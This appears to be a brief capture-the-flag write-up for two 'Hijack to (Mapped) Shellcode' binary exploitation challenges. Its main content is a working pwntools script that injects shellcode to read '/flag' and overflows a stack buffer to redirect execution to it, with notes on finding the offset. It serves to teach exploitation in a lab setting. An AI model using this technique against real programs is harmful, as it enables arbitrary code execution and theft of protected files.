# Hijack to (Mapped) Shellcode

## Hijack to (Mapped) Shellcode (easy)

- Address to shellcode location is given in output
- GDB -> `disas challenge` -> `lea    rax,[rbp-0x80]` -> offset should be 0x88
- But this gave one-byte off (indicated from helpful debug output); 0x89 worked:

```python
from pwn import *

p = process('/challenge/binary-exploitation-hijack-to-mmap-shellcode-w')
context.arch = 'amd64'

mapped_addr = 0x2edca000
shellcode = asm(shellcraft.amd64.cat('/flag'))
p.sendline(shellcode)

offset = 0x89
payload = b'A'*offset
payload += p64(mapped_addr)
p.sendline(payload)

p.interactive()
```

## Hijack to (Mapped) Shellcode (hard)

0x79 instead of 0x89 in prev solution
